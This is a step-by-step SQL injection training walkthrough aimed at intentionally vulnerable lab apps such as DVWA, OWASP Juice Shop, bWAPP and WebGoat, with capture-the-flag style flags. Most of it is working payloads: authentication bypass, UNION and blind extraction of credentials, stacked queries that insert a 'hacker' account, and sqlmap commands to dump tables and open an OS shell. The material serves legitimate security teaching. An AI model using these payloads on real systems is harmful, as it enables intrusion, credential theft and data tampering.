# SQL Injection Walkthrough

Step-by-step exercises for mastering SQL injection across multiple vulnerable platforms.

---

## Lab 1: DVWA - SQL Injection Basics

### Environment Setup

1. Start the CyberLab environment:
```bash
cd /path/to/cyberlab
docker-compose up -d dvwa
```

2. Access DVWA at `http://localhost:8081`

3. Login with default credentials: `admin` / `password`

4. Navigate to **DVWA Security** and set security level to **Low**

5. Click **Setup/Reset DB** to initialize the database

### Exercise 1: Basic Authentication Bypass

**Target:** DVWA SQL Injection page

1. Navigate to **SQL Injection** in the left menu

2. You'll see a form asking for a User ID. Try entering `1`:
```
User ID: 1
```
The query being executed is:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
```

3. Now try entering a single quote to break the query:
```
User ID: '
```
You should see an error - this confirms SQL injection vulnerability!

4. Enter the classic bypass payload:
```
' OR '1'='1
```

This transforms the query to:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1'
```

Result: All users are returned because `'1'='1'` is always true.

### Exercise 2: UNION-Based Data Extraction

**Goal:** Extract data from other tables using UNION SELECT

1. First, determine the number of columns:
```
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--  ← This should cause an error
```
Result: 2 columns in the original query

2. Confirm with UNION SELECT:
```
1' UNION SELECT NULL,NULL--
```

3. Find which columns display data:
```
1' UNION SELECT 'test1','test2'--
```

4. Extract database version:
```
1' UNION SELECT version(),user()--
```

5. List all databases:
```
1' UNION SELECT schema_name,NULL FROM information_schema.schemata--
```

6. List tables in dvwa database:
```
1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='dvwa'--
```

7. List columns in users table:
```
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

8. Extract usernames and password hashes:
```
1' UNION SELECT user,password FROM users--
```

**Flag: `FLAG{sql_1nj3ct10n_m4st3r}`**

---

## Lab 2: DVWA - Medium Security

### Bypassing Basic Filters

1. Set DVWA security to **Medium**

2. The form now uses a dropdown - inspect with Browser DevTools

3. Intercept the request with Burp Suite:
```
POST /vulnerabilities/sqli/ HTTP/1.1
...
id=1&Submit=Submit
```

4. Modify the `id` parameter - note that quotes are escaped:
```
id=1 OR 1=1--
```

5. For UNION attacks, use numeric injection:
```
id=1 UNION SELECT user,password FROM users--
```

**Flag: `FLAG{un10n_b4s3d_pwn3d}`**

---

## Lab 3: Juice Shop - Blind SQL Injection

### Boolean-Based Blind SQLi

**Target:** OWASP Juice Shop login at `http://localhost:3000`

1. Navigate to the login page

2. Try basic injection in email field:
```
' OR 1=1--
```

3. You're logged in as admin! But let's extract data blind.

4. For boolean-based blind injection, use conditional responses:
```
admin@juice-sh.op' AND SUBSTRING(password,1,1)='a'--
```

5. Iterate through characters to extract the password hash.

### Time-Based Blind SQLi

When no visible difference in response:

1. Use time delays to infer data:
```
admin@juice-sh.op' AND SLEEP(5)--
```

2. Conditional time delay:
```
admin@juice-sh.op' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--
```

3. Automate with sqlmap:
```bash
sqlmap -u "http://localhost:3000/rest/user/login" \
  --data="email=admin&password=test" \
  --level=5 --risk=3 \
  --technique=T
```

**Flag: `FLAG{bl1nd_sql1_t1m3_b4s3d}`**

---

## Lab 4: bWAPP - Error-Based SQLi

### Leveraging Error Messages

**Target:** bWAPP at `http://localhost:8082` (if configured)

1. Login with `bee` / `bug`

2. Navigate to **SQL Injection (GET/Search)**

3. Use EXTRACTVALUE for error-based extraction (MySQL):
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
```

4. Extract database names:
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1)))--
```

5. For MSSQL, use CONVERT errors:
```
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

**Flag: `FLAG{3rr0r_b4s3d_l34k}`**

---

## Lab 5: WebGoat - Advanced Techniques

### Second-Order SQL Injection

**Concept:** Payload is stored, then executed later in a different context.

1. Access WebGoat at `http://localhost:8080/WebGoat`

2. Register a new account with username:
```
admin'--
```

3. The username is stored in the database

4. When updating password, the query becomes:
```sql
UPDATE users SET password='newpass' WHERE username='admin'--'
```

5. You've changed the admin's password!

### Stacked Queries

If the database supports stacked queries:
```
1'; INSERT INTO users(username,password) VALUES('hacker','pwned')--
```

---

## Lab 6: Mutillidae - Comprehensive Practice

### Multi-Vector SQLi

1. Access Mutillidae at configured port

2. Navigate to **OWASP 2017 > A1 - Injection > SQLi - Extract Data > User Info (SQL)**

3. Practice all techniques:
   - Authentication bypass
   - UNION-based extraction
   - Error-based injection
   - Blind injection

4. Try the **SQLi - Insert Injection** module for INSERT statement attacks:
```
test','test'); INSERT INTO accounts(username,password) VALUES('hacker','pwned')--
```

---

## Automating with sqlmap

### Basic Usage

```bash
# Enumerate databases
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx;security=low" \
  --dbs

# Enumerate tables
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx;security=low" \
  -D dvwa --tables

# Dump table data
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx;security=low" \
  -D dvwa -T users --dump

# Get OS shell (if permissions allow)
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx;security=low" \
  --os-shell
```

### POST Request Injection

```bash
sqlmap -u "http://target/login" \
  --data="username=admin&password=test" \
  -p username \
  --dbs
```

### Through Burp Suite

1. Capture request in Burp Suite
2. Save to file: `request.txt`
3. Run sqlmap:
```bash
sqlmap -r request.txt --dbs
```

---

## Verification Checklist

- [ ] Successfully bypassed authentication with `' OR '1'='1`
- [ ] Extracted database version using UNION SELECT
- [ ] Enumerated database structure (schemas, tables, columns)
- [ ] Extracted user credentials from users table
- [ ] Cracked extracted password hashes
- [ ] Performed blind SQL injection
- [ ] Used sqlmap for automated exploitation
- [ ] Tried stacked queries for data modification

---

## Next Steps

After completing these labs:

1. Increase DVWA security to **High** and bypass the filters
2. Try SQL injection on Juice Shop challenges
3. Explore second-order injection scenarios
4. Practice WAF bypass techniques
5. Study parameterized queries for defense understanding
